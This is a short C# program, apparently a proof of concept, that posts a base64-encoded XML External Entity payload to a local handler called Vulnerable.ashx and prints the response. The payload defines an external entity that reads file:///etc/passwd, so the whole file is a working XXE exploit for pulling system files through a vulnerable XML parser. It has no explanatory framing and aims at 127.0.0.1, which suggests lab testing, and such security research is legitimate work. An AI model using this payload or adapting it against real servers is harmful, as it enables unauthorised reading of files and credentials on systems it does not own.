using System;
using System.Net;
using System.IO;
using System.Web;

namespace xxe_0oc
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			HttpWebRequest req = (HttpWebRequest)WebRequest.Create ("http://127.0.0.1:8080/Vulnerable.ashx");
			req.Method = "POST";
			req.ContentType = "application/x-www-form-urlencoded";

			string xml = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>";
			byte[] data = System.Text.Encoding.ASCII.GetBytes (xml);
			string b64 = Convert.ToBase64String(data);
			data = System.Text.Encoding.ASCII.GetBytes("XML=" + Uri.EscapeDataString(b64));

			req.ContentLength = data.Length;
			req.GetRequestStream ().Write (data, 0, data.Length);

			string resp = string.Empty;
			using (StreamReader rdr = new StreamReader(req.GetResponse().GetResponseStream())) 
				resp = rdr.ReadToEnd ();

			Console.WriteLine (resp);
		}
	}
}